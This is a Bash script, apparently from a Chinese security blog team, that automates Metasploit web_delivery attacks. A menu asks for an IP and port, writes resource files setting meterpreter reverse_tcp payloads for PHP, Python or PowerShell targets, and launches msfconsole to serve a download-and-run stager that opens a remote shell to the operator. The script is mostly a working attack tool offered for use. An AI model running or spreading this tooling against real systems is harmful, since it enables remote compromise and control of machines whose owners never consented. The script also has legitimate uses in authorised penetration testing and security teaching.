#!/bin/bash
  clear
  echo "   ____ _               _    _                   "
  echo "  / ___| |__   ___  ___| | _(_)_ __   __ _             "
  echo " | |   | '_ \ / _ \/ __| |/ / | '_ \ / _\ |            "
  echo " | |___| | | |  __/ (__|   <| | | | | (_| |  _   _   _ "
  echo "  \____|_| |_|\___|\___|_|\_\_|_| |_|\__/ | (_) (_) (_)"
  echo "                                     	|___/    "
  echo -e '-- -- +=[(c) 2017 | www.ggsec.cn | www.secist.com | Demon '

  echo -e "/==========================########========================\\"
  echo -e "|                             # v1.2                       |"
  echo -e "|                         版本改进更新1.2                  |"
  echo -e "|                        #检查脚本中请稍等.........        |"
  echo -e "|———————————#—————————————————#——————————————————#—————————|"
  echo -e "|                                            Demon 2017    |"
  echo -e "\==========================================================/"
  echo "   "
  sleep 1
  echo "   "
  # check msfconsole
  which msfconsole > /dev/null 2>&1
  if [ "$?" -eq "0" ]; then
  msfconsole='1'
  else
  msfconsole='0'
  fi
  # check msfvenom
  which msfvenom > /dev/null 2>&1
  if [ "$?" -eq "0" ]; then
  msfvenom='1'
  else
  msfvenom='0'
  fi
  echo -n Check script  = =;
  sleep 1 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done
  if [ "$msfconsole" == "1" ] && [ "$msfvenom" == "1" ]   ;then
  echo -e " 【已找到】"
  echo ""
  echo ""
  echo -e 'msfconsole    【已找到】'
  echo -e 'msfvenom      【已找到】'
  echo ""
  sleep 2
  fi
  if [ "$msfconsole" == "0" ] || [ "$msfvenom" == "0" ]; then
  fail='1'
  echo -en "\b \e[0;31m【Fail】\e[0m"
  echo ""
  echo ""
  fi
  if [ "$msfconsole" == "0" ] ;then
  echo -e 'msfconsole    \e[0;31m【!!】 Not Found, first must be installed metasploit\e[0m';
  fi
  if [ "$msfvenom" == "0" ] ;then
  echo -e 'msfvenom      \e[0;31m【!!】 Not Found, first must be install metasploit\e[0m';
  fi
  menu()
  {
  clear
  echo "              _     _                     _       _"
  echo "___  ___  ___(_)___| |_     ___  ___ _ __(_)_ __ | |_"
  echo "/ __|/ _ \/ __| / __| __|   / __|/ __| '__| | '_ \| __|"
  echo "\__ \  __/ (__| \__ \ |_    \__ \ (__| |  | | |_) | |_ "
  echo "|___/\___|\___|_|___/\__|___|___/\___|_|  |_| .__/ \__|"
  echo "        |_____|              |_|                      "
  echo "   "
  echo "                                                 v  1.2 "

  echo -e "/==========================########========================\\"
  echo -e "|               #我的博客www.ggsec.cn#                     |"
  echo -e "|               #Metasploit Payload Generator#             |"
  echo -e "|               #我的第一个自动化简单小脚本#               |"
  echo -e "|               ##即刻安全博客 www.secist.com              |"
  echo -e "|———————————#—————————————————#——————————————————#—————————|"
  echo -e "|                                            Demon 2017    |"
  echo -e "\==========================================================/"
  echo "   "
  sleep 1
  echo "   "
  echo "[1]  web_delivery(php)	           [2]  web_delivery(python)"
  echo "[3]  web_delivery(powershell)      [4]  exit"
  echo "[5]  About Me"
  echo " "
  echo  "################################################################## "
  echo -e "请选择你的payload: \c"
  read number
  case $number in
    1)
    echo -e "请输入你的ip地址: \c"
    read ip
    echo -e "请输入你的端口: \c"
    read port
    echo  "################################################################## "
    echo "use exploit/multi/script/web_delivery" >> php.rc
    echo "set PAYLOAD php/meterpreter/reverse_tcp" >> php.rc
    echo "set TARGET 1" >> php.rc
    echo "set LHOST $ip" >> php.rc
    echo "set LPORT $port" >> php.rc
    echo "set URIPATH /" >> php.rc
    echo "run" >> php.rc
    msfconsole -r php.rc
        ;;
    2)
    echo -e "请输入你的ip地址: \c"
    read ip
    echo -e "请输入你的端口: \c"
    read port
    echo  "################################################################## "
    echo "use exploit/multi/script/web_delivery" >> python.rc
    echo "set LHOST $ip" >> python.rc
    echo "set LPORT $port" >> python.rc
    echo "set URIPATH /" >> python.rc
    echo "run" >>python.rc
    msfconsole -r python.rc
        ;;
    3)
    echo -e "请输入你的ip地址: \c"
    read ip
    echo -e "请输入你的端口: \c"
    read port
    echo  "################################################################## "
    echo "use exploit/multi/script/web_delivery" >> powershell.rc
    echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> powershell.rc
    echo "set TARGET 2" >> powershell.rc
    echo "set LHOST $ip" >> powershell.rc
    echo "set LPORT $port" >> powershell.rc
    echo "set URIPATH /" >> powershell.rc
    echo "run" >> powershell.rc
    msfconsole -r powershell.rc
    ;;
    4)
        exit
        ;;
    5)
      menu1
      ;;
    *)
        menu
        ;;
    esac

}


menu1()
{
clear
echo -e "_______________________________________________________________________"
echo -e "    我是即刻安全团队的 Demon，平时较活跃于漏洞银行、ichunqiu、等平台。 主要擅长web安全、黑苹果及Kali的渗透测试等。目前专注于metaspolit的研究学习，希望借助本套教程 分享一些我的学习思路和经验。"
echo -e "    对课程内容有任何疑问，都可通过以下渠道与我们取得联系:  "
echo -e "                     < My Blog: www.ggsec.cn >"
echo -e "                    < My Team Blog: www.secist.com>"
echo "                          即刻官方QQ 群：532925486 "
echo "                           欢迎使用我的脚本 v1.2"
echo -e "---------------------------------------------------------------------- "
echo -e "                             \   ^__^             "
echo -e "                              \  (oo)\_______     "
echo -e "                                 (__)\       )\/\ "
echo -e "                                     ||----w |    "
echo -e "                                     ||     ||     "
echo "  "
echo  "[1]back meun"
echo  "[2]exit "
echo -e "请输入序号：\c"
read number
case $number in

    1)
        menu
        ;;
    2)
    exit
    ;;
    *)
      menu1
        ;;
    esac

}

menu
rm php.rc
rm python.rc
rm powershell.rc
